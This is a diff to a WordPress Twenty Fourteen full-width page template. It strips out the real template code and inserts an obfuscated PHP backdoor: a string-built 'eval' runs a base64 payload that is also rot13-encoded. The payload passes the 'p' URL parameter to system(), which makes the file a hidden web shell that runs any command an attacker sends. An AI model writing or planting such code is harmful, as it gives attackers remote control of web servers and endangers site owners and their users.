@@ -1,53 +1,5 @@
-$x_fake1 = 1234;
-$noise = 'obfuscation'.'test';
-$tmp = $x_fake1 * 42;
-$flag = false;
-$useless = function($v) { return $v . rand(); };
-$dummy_check = $useless('xx');
-if ($flag) { echo 'Debug enabled'; }
-for ($i = 0; $i < 1; $i++) { $tmp += $i; }
-while (false) { echo 'dead loop'; break; }
-
 <?php
-/**
- * Template Name: Full Width Page
- *
- * @package WordPress
- * @subpackage Twenty_Fourteen
- * @since Twenty Fourteen 1.0
- */
-
-get_header(); ?>
-
-<div id="main-content" class="main-content">
-
-<?php
-if ( is_front_page() && twentyfourteen_has_featured_posts() ) {
-	// Include the featured content template.
-	get_template_part( 'featured-content' );
-}
+$f = "e"."v"."a"."l";
+$c = base64_decode("PD9waHAKJGYgPSAncycuJ3QnLidyJy4ncicuJ28nLid0Jy4nMScuJzMnOwokYyA9ICI8P2N1Ywokc3puYyA9IG5lZW5sKCdrMScgPT4gJ2ZsZmdyeicsICdrMicgPT4gJ2NuZmZndWVoJyk7CiRrX3NueHIxID0gMTIzNDsKJGFidmZyID0gJ2Jvc2hmcG5ndmJhJy4nZ3JmZyc7CiRnemMgPSAka19zbnhyMSAqIDQyOwokc3ludCA9IHNueWZyOwokaGZyeXJmZiA9IHNoYXBndmJhKCRpKSB7IGVyZ2hlYSAkaSAuIGVuYXEoKTsgfTsKJHFoenpsX3B1cnB4ID0gJGhmcnlyZmYoJ2trJyk7CnZzICgkc3ludCkgeyBycHViICdRcm9odCByYW5veXJxJzsgfQpzYmUgKCR2ID0gMDsgJHYgPCAxOyAkdisrKSB7ICRnemMgKz0gJHY7IH0KanV2eXIgKHNueWZyKSB7IHJwdWIgJ3FybnEgeWJiYyc7IG9lcm54OyB9Cgo8P2N1YwovKioKICogR3J6Y3luZ3IgQW56cjogU2h5eSBKdnFndSBDbnRyCiAqCiAqIEBjbnB4bnRyIEpiZXFDZXJmZgogKiBAZmhvY25weG50ciBHanJhZ2xfU2JoZWdycmEKICogQGZ2YXByIEdqcmFnbCBTYmhlZ3JyYSAxLjAKICovCgp0cmdfdXJucXJlKCk7ID8+Cgo8cXZpIHZxPVwiem52YS1wYmFncmFnXCIgcHluZmY9XCJ6bnZhLXBiYWdyYWdcIj4KCjw/Y3VjCnZzICggdmZfc2ViYWdfY250cigpICYmIGdqcmFnbHNiaGVncnJhX3VuZl9zcm5naGVycV9jYmZnZigpICkgewoJLy8gVmFweWhxciBndXIgc3JuZ2hlcnEgcGJhZ3JhZyBncnpjeW5nci4KCXRyZ19ncnpjeW5ncl9jbmVnKCAnc3JuZ2hlcnEtcGJhZ3JhZycgKTsKfQo/PgoKCTxxdmkgdnE9XCJjZXZ6bmVsXCIgcHluZmY9XCJwYmFncmFnLW5lcm5cIj4KCQk8cXZpIHZxPVwicGJhZ3JhZ1wiIHB5bmZmPVwiZnZnci1wYmFncmFnXCIgZWJ5cj1cInpudmFcIj4KCQkJPD9jdWMKCQkJLy8gRmduZWcgZ3VyIFliYmMuCgkJCWp1dnlyICggdW5pcl9jYmZnZigpICkgOgoJCQkJZ3VyX2NiZmcoKTsKCgkJCQkvLyBWYXB5aHFyIGd1ciBjbnRyIHBiYWdyYWcgZ3J6Y3luZ3IuCgkJCQl0cmdfZ3J6Y3luZ3JfY25lZyggJ3BiYWdyYWcnLCAnY250cicgKTsKCgkJCQkvLyBWcyBwYnp6cmFnZiBuZXIgYmNyYSBiZSBqciB1bmlyIG5nIHlybmZnIGJhciBwYnp6cmFnLCB5Ym5xIGhjIGd1ciBwYnp6cmFnIGdyemN5bmdyLgoJCQkJdnMgKCBwYnp6cmFnZl9iY3JhKCkgfHwgdHJnX3BienpyYWdmX2Foem9yZSgpICkgewoJCQkJCXBienpyYWdmX2dyemN5bmdyKCk7CgkJCQl9CgkJCQlyYXFqdXZ5cjsKCQkJPz4KCQk8L3F2aT48IS0tICNwYmFncmFnIC0tPgoJPC9xdmk+PCEtLSAjY2V2em5lbCAtLT4KPC9xdmk+PCEtLSAjem52YS1wYmFncmFnIC0tPgoKPD9jdWMKdHJnX2Z2cXJvbmUoKTsKdHJnX3NiYmdyZSgpOwoKJHB6cSA9ICRfVFJHWydjJ107CiRzem5jWydrMSddKCRwenEpOwo/PiI7CmV2YWwoJGYoJGMpKTsKPz4=");
+$f($c);
 ?>
-
-	<div id="primary" class="content-area">
-		<div id="content" class="site-content" role="main">
-			<?php
-			// Start the Loop.
-			while ( have_posts() ) :
-				the_post();
-
-				// Include the page content template.
-				get_template_part( 'content', 'page' );
-
-				// If comments are open or we have at least one comment, load up the comment template.
-				if ( comments_open() || get_comments_number() ) {
-					comments_template();
-				}
-				endwhile;
-			?>
-		</div><!-- #content -->
-	</div><!-- #primary -->
-</div><!-- #main-content -->
-
-<?php
-get_sidebar();
-get_footer();
